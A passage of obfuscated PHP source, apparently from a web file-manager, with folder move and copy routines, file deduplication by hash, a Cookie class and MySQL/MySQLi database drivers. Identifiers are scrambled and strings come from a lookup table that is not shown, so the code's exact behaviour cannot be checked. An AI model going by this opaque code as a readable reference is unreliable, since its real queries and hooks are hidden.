$—Ø”Ü¼µ[$ÅÀ·¡††[525]], $—Ø”Ü¼µ[$ÅÀ·¡††[89]]); $ç›ŒôÎĞ = !0; if ($¨ÍÆ×ÒŠ) { $’Íş¥Ó[$ÅÀ·¡††[613]][] = $—Ø”Ü¼µ[$ÅÀ·¡††[525]]; } } } } } if ($ç›ŒôÎĞ && !$’Íş¥Ó[$ÅÀ·¡††[644]]) { $’Íş¥Ó[$ÅÀ·¡††[644]] = !0; } return $¥ˆöª•¾; } private function _moveForce($ŞÜ•şğ÷, $‘Õ´¸å¿, $øêú¸’•) { $…•¡Ö³ =& $_SERVER[Õò”†—·]; $å¦“ç˜‚ = $this->sourceInfo($ŞÜ•şğ÷); $Ä”ê¤èò = $this->sourceInfo($‘Õ´¸å¿); $±Şö·ÂÄ = $å¦“ç˜‚[$…•¡Ö³[469]] == $…•¡Ö³[101]; $À¼‰œèá = array($…•¡Ö³[461] => $Ä”ê¤èò[$…•¡Ö³[194]], $…•¡Ö³[636] => $Ä”ê¤èò[$…•¡Ö³[569]] . $Ä”ê¤èò[$…•¡Ö³[194]] . $…•¡Ö³[60], $…•¡Ö³[632] => $Ä”ê¤èò[$…•¡Ö³[191]], $…•¡Ö³[633] => $Ä”ê¤èò[$…•¡Ö³[554]], $…•¡Ö³[635] => USER_ID, $…•¡Ö³[478] => $øêú¸’•); $´®ÑœŠø = $å¦“ç˜‚[$…•¡Ö³[191]] == SourceModel::TYPE_GROUP && $Ä”ê¤èò[$…•¡Ö³[191]] == SourceModel::TYPE_GROUP && $å¦“ç˜‚[$…•¡Ö³[554]] == $Ä”ê¤èò[$…•¡Ö³[554]]; if (!$´®ÑœŠø && $this->moveClearAuth) { Model($…•¡Ö³[552])->authClear($ŞÜ•şğ÷); } $™É­¹ù× = $å¦“ç˜‚[$…•¡Ö³[489]] == $…•¡Ö³[101] && $Ä”ê¤èò[$…•¡Ö³[489]] != $…•¡Ö³[101]; if ($™É­¹ù×) { $À¼‰œèá[$…•¡Ö³[488]] = 0; } if ($±Şö·ÂÄ) { $éİÅå = array($…•¡Ö³[636] => array($…•¡Ö³[596], $å¦“ç˜‚[$…•¡Ö³[569]] . $å¦“ç˜‚[$…•¡Ö³[194]] . $…•¡Ö³[597])); $ÏÖô¾— = $å¦“ç˜‚[$…•¡Ö³[569]] . $å¦“ç˜‚[$…•¡Ö³[194]] . $…•¡Ö³[60]; $²ïÜŸµ = $Ä”ê¤èò[$…•¡Ö³[569]] . $Ä”ê¤èò[$…•¡Ö³[194]] . $…•¡Ö³[60] . $å¦“ç˜‚[$…•¡Ö³[194]] . $…•¡Ö³[60]; $ãçú½„ç = array($…•¡Ö³[636] => array($…•¡Ö³[645], "\162\x65\x70\x6c\x61\x63\x65\50\x70\x61\x72\145\x6e\x74\114\145\x76\145\154\x2c\x27{$ÏÖô¾—}\x27\x2c\47{$²ïÜŸµ}\x27\51"), $…•¡Ö³[632] => $Ä”ê¤èò[$…•¡Ö³[191]], $…•¡Ö³[633] => $Ä”ê¤èò[$…•¡Ö³[554]]); if ($™É­¹ù×) { $ãçú½„ç[$…•¡Ö³[488]] = 0; } $this->where($éİÅå)->data($ãçú½„ç)->save(); } $this->where(array($…•¡Ö³[475] => $ŞÜ•şğ÷))->data($À¼‰œèá)->save(); return $ŞÜ•şğ÷; } private function clearShare($øÀã’Ç›, $€Î¼¶£İ) { $‚ÅÕ =& $_SERVER[Õò”†—·]; $Ï÷‹ÉË = $this->sourceInfo($øÀã’Ç›); $­ÏˆŞ‡à = $this->sourceInfo($€Î¼¶£İ); if ($Ï÷‹ÉË[$‚ÅÕ[554]] == $­ÏˆŞ‡à[$‚ÅÕ[554]] && $Ï÷‹ÉË[$‚ÅÕ[191]] == $‚ÅÕ[646]) { return; } $Ê®Ã½˜ = array($‚ÅÕ[569] => array($‚ÅÕ[596], $Ï÷‹ÉË[$‚ÅÕ[569]] . $øÀã’Ç› . $‚ÅÕ[597])); $¬Öµ¢×Æ = $this->field($‚ÅÕ[475])->where($Ê®Ã½˜)->getField($‚ÅÕ[194], !0); if (!$¬Öµ¢×Æ) { return; } $Ê®Ã½˜ = array($‚ÅÕ[194] => array($‚ÅÕ[17], $¬Öµ¢×Æ), $‚ÅÕ[647] => 1); $‰½ÍŸ¡‹ = Model($‚ÅÕ[648])->field($‚ÅÕ[649])->where($Ê®Ã½˜)->select(); if (!$‰½ÍŸ¡‹) { return; } $‰½ÍŸ¡‹ = array_to_keyvalue($‰½ÍŸ¡‹, $‚ÅÕ[22], $‚ÅÕ[649]); $Ê®Ã½˜ = array($‚ÅÕ[649] => array($‚ÅÕ[17], $‰½ÍŸ¡‹)); Model($‚ÅÕ[648])->where($Ê®Ã½˜)->save(array($‚ÅÕ[647] => 0)); Model($‚ÅÕ[650])->where($Ê®Ã½˜)->delete(); } public function copyFolderFromIO($õ€¹—Ğ¯, $ˆ’ÀòÑ¯, $ÆäÀ†Éì, $à ´ÏÛ, $§ÀôÇıÈ, $´Ù©©êŸ = false) { $¾øƒæò =& $_SERVER[Õò”†—·]; $é¹¯õ¥ = array($¾øƒæò[614] => array(), $¾øƒæò[615] => array(), $¾øƒæò[613] => array(), $¾øƒæò[651] => array()); $’Ï‡¢à‚ = $´Ù©©êŸ ? $´Ù©©êŸ : $õ€¹—Ğ¯->pathThis($ˆ’ÀòÑ¯); $àå£àîš = $this->fileNameExist($ÆäÀ†Éì, $’Ï‡¢à‚); $ì¦¢˜üÄ = $this->mkdir($ÆäÀ†Éì, $’Ï‡¢à‚, $à ´ÏÛ); if (!$àå£àîš || $à ´ÏÛ == REPEAT_RENAME_FOLDER) { $à ´ÏÛ = !1; } if ($àå£àîš) { $this->_childrenAllMake($àå£àîš); } Hook::trigger($¾øƒæò[652]); $this->_copyChildTo($õ€¹—Ğ¯, $ˆ’ÀòÑ¯, $ì¦¢˜üÄ, $à ´ÏÛ, $é¹¯õ¥, $§ÀôÇıÈ); Hook::trigger($¾øƒæò[653]); if ($ì¦¢˜üÄ) { $this->folderSizeResetChildren($ì¦¢˜üÄ); } $this->_childrenListClear(); Model($¾øƒæò[616])->addAll($é¹¯õ¥[$¾øƒæò[614]], array(), !0); Model($¾øƒæò[617])->eventCopy($ì¦¢˜üÄ); $this->saveAll($é¹¯õ¥[$¾øƒæò[615]]); Model($¾øƒæò[528])->linkAdd($é¹¯õ¥[$¾øƒæò[613]]); Model($¾øƒæò[528])->remove($é¹¯õ¥[$¾øƒæò[651]]); $this->folderSizeReset($ÆäÀ†Éì); $this->updateModifyTime($ÆäÀ†Éì); return $ì¦¢˜üÄ; } private function _copyChildTo($ŠÁÈ¦Œã, $ğ¹ºö–ˆ, $šæàºá, $İãŠÆØ, &$÷å¼•›í, $¹£ğà§) { $ó÷öÁŒ† =& $_SERVER[Õò”†—·]; $Ìèüó³ö = $this->sourceInfoCache($šæàºá); $†İƒÎ²Ú = $ŠÁÈ¦Œã->listPath($ğ¹ºö–ˆ); $†İƒÎ²Ú = $†İƒÎ²Ú ? $†İƒÎ²Ú : array($ó÷öÁŒ†[96] => array(), $ó÷öÁŒ†[95] => array()); $Úçõ‹ÁŠ = array_merge($†İƒÎ²Ú[$ó÷öÁŒ†[96]], $†İƒÎ²Ú[$ó÷öÁŒ†[95]]); $ú´å¸Ù¯ = $this->_addFiles($ŠÁÈ¦Œã, $†İƒÎ²Ú[$ó÷öÁŒ†[96]], $¹£ğà§); $ıöˆé÷º = array(); foreach ($Úçõ‹ÁŠ as &$Íè»¼î) { if (isset($ú´å¸Ù¯[$Íè»¼î[$ó÷öÁŒ†[42]]])) { $Íè»¼î = $ú´å¸Ù¯[$Íè»¼î[$ó÷öÁŒ†[42]]]; } $Íè»¼î[$ó÷öÁŒ†[469]] = $Íè»¼î[$ó÷öÁŒ†[43]] == $ó÷öÁŒ†[88]; $Íè»¼î[$ó÷öÁŒ†[470]] = substr(_get($Íè»¼î, $ó÷öÁŒ†[188], $ó÷öÁŒ†[22]), 0, 10); $Íè»¼î[$ó÷öÁŒ†[89]] = _get($Íè»¼î, $ó÷öÁŒ†[89], 0); $Íè»¼î[$ó÷öÁŒ†[525]] = _get($Íè»¼î, $ó÷öÁŒ†[525], 0); if (!isset($Íè»¼î[$ó÷öÁŒ†[654]]) && $Íè»¼î[$ó÷öÁŒ†[525]]) { $÷å¼•›í[$ó÷öÁŒ†[651]][] = $Íè»¼î[$ó÷öÁŒ†[525]]; } if ($İãŠÆØ) { $íôÌßê = $this->fileNameExistCache($šæàºá, $Íè»¼î[$ó÷öÁŒ†[42]]); if ($íôÌßê) { if ($Íè»¼î[$ó÷öÁŒ†[469]] || $İãŠÆØ == REPEAT_SKIP) { continue; } if ($İãŠÆØ == REPEAT_REPLACE) { $ôˆ¦£“ = $this->sourceInfoCache($íôÌßê); $¾¬µ«€Ğ = $this->fileHistory($ôˆ¦£“, $Íè»¼î[$ó÷öÁŒ†[525]], $Íè»¼î[$ó÷öÁŒ†[89]]); if ($¾¬µ«€Ğ) { $÷å¼•›í[$ó÷öÁŒ†[613]][] = $Íè»¼î[$ó÷öÁŒ†[525]]; } continue; } else { if ($İãŠÆØ == REPEAT_RENAME) { $Íè»¼î[$ó÷öÁŒ†[42]] = $this->fileNameAutoCache($šæàºá, $Íè»¼î[$ó÷öÁŒ†[42]], $İãŠÆØ, !1); } } } } if (!$Íè»¼î[$ó÷öÁŒ†[469]] && $Íè»¼î[$ó÷öÁŒ†[525]] == 0) { continue; } if (!$Íè»¼î[$ó÷öÁŒ†[469]] && $Íè»¼î[$ó÷öÁŒ†[525]]) { $÷å¼•›í[$ó÷öÁŒ†[613]][] = $Íè»¼î[$ó÷öÁŒ†[525]]; } $ıöˆé÷º[] = $this->_makeItemData($Íè»¼î, $Ìèüó³ö, $Íè»¼î[$ó÷öÁŒ†[42]]); } unset($Íè»¼î); if (!empty($ıöˆé÷º)) { $this->addAll($ıöˆé÷º); $this->_childrenListSelect($šæàºá); } $œ—ÁÆÁ¬ = $this->_childrenList($šæàºá); $œ—ÁÆÁ¬ = array_to_keyvalue($œ—ÁÆÁ¬, $ó÷öÁŒ†[42]); foreach ($Úçõ‹ÁŠ as $Íè»¼î) { $ôˆ¦£“ = $œ—ÁÆÁ¬[$Íè»¼î[$ó÷öÁŒ†[42]]]; $ŞÉãßëó = $ôˆ¦£“[$ó÷öÁŒ†[194]]; $this->_copyApplyMeta($ôˆ¦£“, $÷å¼•›í); if ($Íè»¼î[$ó÷öÁŒ†[43]] == $ó÷öÁŒ†[88]) { $Íè»¼î[$ó÷öÁŒ†[97]] = $ŠÁÈ¦Œã->getPathInner($Íè»¼î[$ó÷öÁŒ†[97]]); $this->_copyChildTo($ŠÁÈ¦Œã, $Íè»¼î[$ó÷öÁŒ†[97]], $ŞÉãßëó, $İãŠÆØ, $÷å¼•›í, $¹£ğà§); } } } private function _addFiles($ıˆõ Üã, $†«–òí“, $­ŞíõÕî) { $¥Šş° =& $_SERVER[Õò”†—·]; if (!$†«–òí“ || count($†«–òí“) == 0) { return array(); } $ï„–ÚŠ = array(); foreach ($†«–òí“ as &$÷÷øë»Ì) { Hook::trigger($¥Šş°[655], $÷÷øë»Ì); $÷÷øë»Ì[$¥Šş°[97]] = $ıˆõ Üã->getPathInner($÷÷øë»Ì[$¥Šş°[97]]); $›ú£—Ì = $ıˆõ Üã->hashSimple($÷÷øë»Ì[$¥Šş°[97]]); $ã®Êò¨õ = $ıˆõ Üã->hashMd5($÷÷øë»Ì[$¥Šş°[97]]); if (strlen($ã®Êò¨õ) > 10 && !isset($ï„–ÚŠ[$ã®Êò¨õ])) { $ï„–ÚŠ[$ã®Êò¨õ] = array(); } $÷÷øë»Ì[$¥Šş°[656]] = $›ú£—Ì; $÷÷øë»Ì[$¥Šş°[531]] = $ã®Êò¨õ; $ï„–ÚŠ[$ã®Êò¨õ][] =& $÷÷øë»Ì; if (count($ï„–ÚŠ[$ã®Êò¨õ]) > 1) { $÷÷øë»Ì[$¥Šş°[654]] = !0; } Hook::trigger($¥Šş°[657], $÷÷øë»Ì); } unset($÷÷øë»Ì); $‰ãßÎ‘² = array($¥Šş°[531] => array($¥Šş°[17], array_keys($ï„–ÚŠ))); $ˆ“ã×£² = Model($¥Šş°[658]); $çò˜¤é = $ˆ“ã×£²->where($‰ãßÎ‘²)->select(); $çò˜¤é = $çò˜¤é ? $çò˜¤é : array(); foreach ($çò˜¤é as $³ƒÁ¸¶¬) { if (!isset($ï„–ÚŠ[$³ƒÁ¸¶¬[$¥Šş°[531]]])) { continue; } $½Ÿî‚ûı = $ï„–ÚŠ[$³ƒÁ¸¶¬[$¥Šş°[531]]]; foreach ($½Ÿî‚ûı as &$÷÷øë»Ì) { $÷÷øë»Ì[$¥Šş°[525]] = $³ƒÁ¸¶¬[$¥Šş°[525]]; $÷÷øë»Ì[$¥Šş°[654]] = !0; } unset($÷÷øë»Ì); } $×¨˜º¸ = array(); foreach ($†«–òí“ as $²±ÑöÙÈ) { Hook::trigger($¥Šş°[659], $²±ÑöÙÈ); if (isset($²±ÑöÙÈ[$¥Šş°[654]]) && $²±ÑöÙÈ[$¥Šş°[654]]) { Hook::trigger($¥Šş°[660], $²±ÑöÙÈ); continue; } $–Ÿ–ˆà¿ = $ıˆõ Üã->getPathInner($²±ÑöÙÈ[$¥Šş°[97]]); $¢¿ù¦ÍÃ = $ˆ“ã×£²->addFileMake($–Ÿ–ˆà¿, $²±ÑöÙÈ[$¥Šş°[89]], $²±ÑöÙÈ[$¥Šş°[656]], $²±ÑöÙÈ[$¥Šş°[531]], $²±ÑöÙÈ[$¥Šş°[42]], $­ŞíõÕî); Hook::trigger($¥Šş°[660], $²±ÑöÙÈ); if (!is_array($¢¿ù¦ÍÃ)) { continue; } $×¨˜º¸[] = $¢¿ù¦ÍÃ; } $ˆ“ã×£²->addAll($×¨˜º¸); $‰ãßÎ‘² = array($¥Šş°[531] => array($¥Šş°[17], array_keys($ï„–ÚŠ))); $çò˜¤é = $ˆ“ã×£²->where($‰ãßÎ‘²)->select(); $çò˜¤é = $çò˜¤é ? $çò˜¤é : array(); foreach ($çò˜¤é as $³ƒÁ¸¶¬) { if (!isset($ï„–ÚŠ[$³ƒÁ¸¶¬[$¥Šş°[531]]])) { continue; } $„ëşö¼ä =& $ï„–ÚŠ[$³ƒÁ¸¶¬[$¥Šş°[531]]]; foreach ($„ëşö¼ä as &$÷÷øë»Ì) { $÷÷øë»Ì[$¥Šş°[525]] = $³ƒÁ¸¶¬[$¥Šş°[525]]; } unset($÷÷øë»Ì); } $çşòºÕœ = array(); foreach ($†«–òí“ as $Í„Ğ§ß‡) { $çşòºÕœ[$Í„Ğ§ß‡[$¥Šş°[42]]] = $Í„Ğ§ß‡; } return $çşòºÕœ; } } goto f°Ñ‹†·Ïá; C¹Ì‡¼ˆˆ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($«­™û¶÷ = '', $æÈÍ´›„ = 0) { if (is_string($«­™û¶÷) && $«­™û¶÷ != $_SERVER[Õò”†—·][22]) { $this->prefix = $«­™û¶÷; } if (is_numeric($æÈÍ´›„) && $æÈÍ´›„ > 0) { $this->expire = $æÈÍ´›„; } } public static function getInstance() { static $‚ûÛîò…; if ($‚ûÛîò… === null) { $‚ûÛîò… = new self(); } return $‚ûÛîò…; } private static $cookieDisable = false; public static function disable($ŸòÔĞÏï) { self::$cookieDisable = $ŸòÔĞÏï; } private static $sameCookieSet = array(); public static function set($Å…«º», $ˆš™ÌÄø, $€¦²Şï• = 0, $®§¬¡Ğ = false, $«õ …´‚ = false) { $ÜÍ–ÒÀ¥ =& $_SERVER[Õò”†—·]; if (self::$cookieDisable) { return; } if (!$€¦²Şï•) { $€¦²Şï• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Å…«º»]) && self::$sameCookieSet[$Å…«º»] == $ˆš™ÌÄø . $€¦²Şï•) { return; } self::$sameCookieSet[$Å…«º»] = $ˆš™ÌÄø . $€¦²Şï•; if (!$«õ …´‚) { $«õ …´‚ = str_replace(HOST, $ÜÍ–ÒÀ¥[22], APP_HOST); $«õ …´‚ = _get($GLOBALS, $ÜÍ–ÒÀ¥[932], $«õ …´‚); } $æİÒ®¯· = $ÜÍ–ÒÀ¥[22]; setcookie($Å…«º», $ˆš™ÌÄø, time() + $€¦²Şï•, $ÜÍ–ÒÀ¥[18] . trim($«õ …´‚, $ÜÍ–ÒÀ¥[18]) . $æİÒ®¯·, !1, !1, $®§¬¡Ğ); } public static function setSafe($§…ƒ¨×¥, $¡ı§‰óÃ, $äûÃĞÓÇ = 0) { self::set($§…ƒ¨×¥, $¡ı§‰óÃ, $äûÃĞÓÇ, !0); } public static function get($¹õ¤»·õ) { static $¨™âÃŒ = false; if (!$¨™âÃŒ) { self::initHeaderCookie(); $¨™âÃŒ = !0; } return isset($_COOKIE[$¹õ¤»·õ]) ? $_COOKIE[$¹õ¤»·õ] : !1; } private static function initHeaderCookie() { $¡©ê‡òÊ =& $_SERVER[Õò”†—·]; if (!isset($_SERVER[$¡©ê‡òÊ[933]]) || !$_SERVER[$¡©ê‡òÊ[933]]) { return; } $°–‘¡é× = explode($¡©ê‡òÊ[84], $_SERVER[$¡©ê‡òÊ[933]]); foreach ($°–‘¡é× as $éÕ¼ïêò) { $éÕ¼ïêò = explode($¡©ê‡òÊ[934], $éÕ¼ïêò); if (count($éÕ¼ïêò) != 2 || !isset($éÕ¼ïêò[1])) { continue; } $_COOKIE[trim($éÕ¼ïêò[0])] = trim($éÕ¼ïêò[1]); } } public static function remove($Ï—ÕÔ°, $¯üøö£¹ = false) { unset($_COOKIE[$Ï—ÕÔ°]); self::set($Ï—ÕÔ°, $_SERVER[Õò”†—·][22], 1, $¯üøö£¹); } } class DbMysql extends Db { public function __construct($×îšû†û = '') { $¶‹Ü³ì´ =& $_SERVER[Õò”†—·]; if (!extension_loaded($¶‹Ü³ì´[854])) { think_exception(think_lang($¶‹Ü³ì´[24]) . $¶‹Ü³ì´[935]); } if (!empty($×îšû†û)) { $this->config = $×îšû†û; if (empty($this->config[$¶‹Ü³ì´[27]])) { $this->config[$¶‹Ü³ì´[27]] = $¶‹Ü³ì´[22]; } } } public function connect($øÁÊÅƒê = '', $¨ßÉö›â = 0, $³Šñ«¥à = false) { $Èµ•ŸßÃ =& $_SERVER[Õò”†—·]; if (!isset($this->linkID[$¨ßÉö›â])) { if (empty($øÁÊÅƒê)) { $øÁÊÅƒê = $this->config; } $µ±ƒö™ = $øÁÊÅƒê[$Èµ•ŸßÃ[936]] . ($øÁÊÅƒê[$Èµ•ŸßÃ[937]] ? "\x3a{$øÁÊÅƒê[$Èµ•ŸßÃ[937]]}" : $Èµ•ŸßÃ[22]); $†´Ùãğ‰ = !empty($øÁÊÅƒê[$Èµ•ŸßÃ[27]][$Èµ•ŸßÃ[28]]) ? $øÁÊÅƒê[$Èµ•ŸßÃ[27]][$Èµ•ŸßÃ[28]] : $this->pconnect; if ($†´Ùãğ‰) { $this->linkID[$¨ßÉö›â] = mysql_pconnect($µ±ƒö™, $øÁÊÅƒê[$Èµ•ŸßÃ[938]], $øÁÊÅƒê[$Èµ•ŸßÃ[939]], 131072); } else { $this->linkID[$¨ßÉö›â] = mysql_connect($µ±ƒö™, $øÁÊÅƒê[$Èµ•ŸßÃ[938]], $øÁÊÅƒê[$Èµ•ŸßÃ[939]], !0, 131072); } if (!$this->linkID[$¨ßÉö›â] || !empty($øÁÊÅƒê[$Èµ•ŸßÃ[31]]) && !mysql_select_db($øÁÊÅƒê[$Èµ•ŸßÃ[31]], $this->linkID[$¨ßÉö›â])) { think_exception(mysql_error()); } $ÍàµäÚ = mysql_get_server_info($this->linkID[$¨ßÉö›â]); mysql_query($Èµ•ŸßÃ[940] . think_config($Èµ•ŸßÃ[941]) . $Èµ•ŸßÃ[68], $this->linkID[$¨ßÉö›â]); if ($ÍàµäÚ > $Èµ•ŸßÃ[942]) { mysql_query($Èµ•ŸßÃ[943], $this->linkID[$¨ßÉö›â]); } $this->connected = !0; if (1 != think_config($Èµ•ŸßÃ[32])) { unset($this->config); } } return $this->linkID[$¨ßÉö›â]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ìÕŞóº) { $•œË°“ =& $_SERVER[Õò”†—·]; if (0 === stripos($ìÕŞóº, $•œË°“[325])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìÕŞóº; if ($this->queryID) { $this->free(); } think_action_status($•œË°“[33], 1); think_status($•œË°“[34]); $this->queryID = mysql_query($ìÕŞóº, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($½¸îˆÂ) { $¦Òà•áæ =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½¸îˆÂ; if ($this->queryID) { $this->free(); } think_action_status($¦Òà•áæ[35], 1); think_status($¦Òà•áæ[34]); $†»‘Ø±À = mysql_query($½¸îˆÂ, $this->_linkID); $this->debug(); if (!1 === $†»‘Ø±À) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Õò”†—·][944], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ø“œæÀ± = mysql_query($_SERVER[Õò”†—·][945], $this->_linkID); $this->transTimes = 0; if (!$ø“œæÀ±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ô­Ö¡‹ö = mysql_query($_SERVER[Õò”†—·][946], $this->_linkID); $this->transTimes = 0; if (!$ô­Ö¡‹ö) { $this->error(); return !1; } } return !0; } private function getAll() { $òÓİÆÇ‘ = array(); if ($this->numRows > 0) { while ($¸êùƒÈè = mysql_fetch_assoc($this->queryID)) { $òÓİÆÇ‘[] = $¸êùƒÈè; } mysql_data_seek($this->queryID, 0); } return $òÓİÆÇ‘; } public function getFields($ë†ô”âï) { $ü¢Çß’ =& $_SERVER[Õò”†—·]; $ìË¬• Ê = $this->query($ü¢Çß’[947] . $this->parseKey($ë†ô”âï)); $ü­Î«ß = array(); if ($ìË¬• Ê) { foreach ($ìË¬• Ê as $ªœ¹ØóÉ => $ç³îÀ´Â) { $ü­Î«ß[$ç³îÀ´Â[$ü¢Çß’[41]]] = array($ü¢Çß’[42] => $ç³îÀ´Â[$ü¢Çß’[41]], $ü¢Çß’[43] => $ç³îÀ´Â[$ü¢Çß’[44]], $ü¢Çß’[45] => (bool) (strtoupper($ç³îÀ´Â[$ü¢Çß’[46]]) === $ü¢Çß’[948]), $ü¢Çß’[47] => $ç³îÀ´Â[$ü¢Çß’[48]], $ü¢Çß’[49] => strtolower($ç³îÀ´Â[$ü¢Çß’[50]]) == $ü¢Çß’[51], $ü¢Çß’[52] => strtolower($ç³îÀ´Â[$ü¢Çß’[53]]) == $ü¢Çß’[54]); } } return $ü­Î«ß; } public function getTables($¬Ø›Œ°— = '') { $ËÇºöÏÉ =& $_SERVER[Õò”†—·]; if (!empty($¬Ø›Œ°—)) { $äç¨ßÄò = $ËÇºöÏÉ[949] . $¬Ø›Œ°— . $ËÇºöÏÉ[950]; } else { $äç¨ßÄò = $ËÇºöÏÉ[951]; } $ø‘å¼é = $this->query($äç¨ßÄò); $Šâ²¯‰ã = array(); foreach ($ø‘å¼é as $«ÙˆİÜ => $Û”ğÙö¤) { $Šâ²¯‰ã[$«ÙˆİÜ] = current($Û”ğÙö¤); } return $Šâ²¯‰ã; } public function replace($‚ïŸŠ‹, $›óÒÓ©ğ = array()) { $ÃışúşÀ =& $_SERVER[Õò”†—·]; foreach ($‚ïŸŠ‹ as $Ìá ‰Œ => $ãÖ ÆöÖ) { $¾¸§çÃÌ = $this->parseValue($ãÖ ÆöÖ); if (is_scalar($¾¸§çÃÌ)) { $ÆøÏ®•[] = $¾¸§çÃÌ; $àÉ‹œ¤í[] = $this->parseKey($Ìá ‰Œ); } } $àÖ›ò›¹ = $ÃışúşÀ[952] . $this->parseTable($›óÒÓ©ğ[$ÃışúşÀ[340]]) . $ÃışúşÀ[953] . implode($ÃışúşÀ[60], $àÉ‹œ¤í) . $ÃışúşÀ[954] . implode($ÃışúşÀ[60], $ÆøÏ®•) . $ÃışúşÀ[955]; return $this->execute($àÖ›ò›¹); } public function insertAll($À¢úÇ›¦, $ßîø³²  = array(), $Ü—“©ñ– = false) { $‰¡’ÇøÃ =& $_SERVER[Õò”†—·]; if (!is_array($À¢úÇ›¦[0])) { return !1; } $ÕèåÚ„ = array_keys($À¢úÇ›¦[0]); $Óæ´Ê«™ = array(); foreach ($À¢úÇ›¦ as $¦å™ıÖ) { $Ó‹òéÊ = array(); foreach ($¦å™ıÖ as $¥Ñ˜ãŸ => $æêÄä°À) { $æêÄä°À = $this->parseValue($æêÄä°À); if (is_scalar($æêÄä°À)) { $Ó‹òéÊ[] = $æêÄä°À; } } $Óæ´Ê«™[] = $‰¡’ÇøÃ[321] . implode($‰¡’ÇøÃ[60], $Ó‹òéÊ) . $‰¡’ÇøÃ[955]; } array_walk($ÕèåÚ„, array($this, $‰¡’ÇøÃ[956])); $´ÃæÈ™” = ($Ü—“©ñ– ? $‰¡’ÇøÃ[957] : $‰¡’ÇøÃ[958]) . $‰¡’ÇøÃ[959] . $this->parseTable($ßîø³² [$‰¡’ÇøÃ[340]]) . $‰¡’ÇøÃ[953] . implode($‰¡’ÇøÃ[60], $ÕèåÚ„) . $‰¡’ÇøÃ[960] . implode($‰¡’ÇøÃ[60], $Óæ´Ê«™); return $this->execute($´ÃæÈ™”); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $áÍıŸÀ÷ =& $_SERVER[Õò”†—·]; $this->error = mysql_errno() . $áÍıŸÀ÷[4] . mysql_error($this->_linkID); if ($áÍıŸÀ÷[22] != $this->queryStr) { $this->error .= LNG($áÍıŸÀ÷[58]) . $this->queryStr; } think_trace($this->error, $áÍıŸÀ÷[22], $áÍıŸÀ÷[59]); return $this->error; } public function escapeString($»†÷µãî) { if ($this->_linkID) { return mysql_real_escape_string($»†÷µãî, $this->_linkID); } else { return mysql_escape_string($»†÷µãî); } } public function parseKey(&$ñ–¡®²Š, $º•Ï‡Ùš = true) { $•ªí²Ä’ =& $_SERVER[Õò”†—·]; if ($º•Ï‡Ùš) { $ñ–¡®²Š = $this->parseKeyCheck($ñ–¡®²Š); } if ($ñ–¡®²Š != $•ªí²Ä’[221] && !preg_match($•ªí²Ä’[961], $ñ–¡®²Š)) { $ñ–¡®²Š = $•ªí²Ä’[445] . trim($ñ–¡®²Š, $•ªí²Ä’[445]) . $•ªí²Ä’[445]; } return $ñ–¡®²Š; } } class DbMysqli extends Db { public function __construct($ŞÄ¡Ì = '') { $²Â’Ÿø÷ =& $_SERVER[Õò”†—·]; if (!extension_loaded($²Â’Ÿø÷[962])) { think_exception(think_lang($²Â’Ÿø÷[24]) . $²Â’Ÿø÷[963]); } if (!empty($ŞÄ¡Ì)) { $this->config = $ŞÄ¡Ì; if (empty($this->config[$²Â’Ÿø÷[27]])) { $this->config[$²Â’Ÿø÷[27]] = $²Â’Ÿø÷[22]; } } } public function connect($–¬Ÿî = '', $ç×‘ÌŞÃ = 0) { $Ë®ÆºÉ =& $_SERVER[Õò”†—·]; if (!isset($this->linkID[$ç×‘ÌŞÃ])) { if (empty($–¬Ÿî)) { $–¬Ÿî = $this->config; } $this->linkID[$ç×‘ÌŞÃ] = new mysqli($–¬Ÿî[$Ë®ÆºÉ[936]], $–¬Ÿî[$Ë®ÆºÉ[938]], $–¬Ÿî[$Ë®ÆºÉ[939]], $–¬Ÿî[$Ë®ÆºÉ[31]], $–¬Ÿî[$Ë®ÆºÉ[937]] ? intval($–¬Ÿî[$Ë®ÆºÉ[937]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ñµßÊŞ = $this->linkID[$ç×‘ÌŞÃ]->server_version; $this->linkID[$ç×‘ÌŞÃ]->query($Ë®ÆºÉ[940] . think_config($Ë®ÆºÉ[941]) . $Ë®ÆºÉ[68]); if ($ñµßÊŞ > $Ë®ÆºÉ[942]) { $this->linkID[$ç×‘ÌŞÃ]->query($Ë®ÆºÉ[943]); } $this->connected = !0; if (1 != think_config($Ë®ÆºÉ[32])) { unset($this->config); } } return $this->linkID[$ç×‘ÌŞÃ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($à–Ìøî) { $½¦¹¥‚… =& $_SERVER[Õò”†—·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $à–Ìøî; if ($this->queryID) { $this->free(); } think_action_status($½¦¹¥‚…[33], 1); think_status($½¦¹¥‚…[34]); $this->queryID = $this->_linkID->query($à–Ìøî); if ($this->_linkID->more_results()) { while (($à†¹öœ¬ = $this->_linkID->next_result()) != NULL) { $à†¹öœ¬->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ŞêÜ§‰¨) { $ –¹ˆƒ =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŞêÜ§‰¨; if ($this->queryID) { $this->free(); } think_action_status($ –¹ˆƒ[35], 1); think_status($ –¹ˆƒ[34]); $ğãì’¡Ï = $this->_linkID->query($ŞêÜ§‰¨); $this->debug(); if (!1 === $ğãì’¡Ï) { $this->error(); return !1; } else { 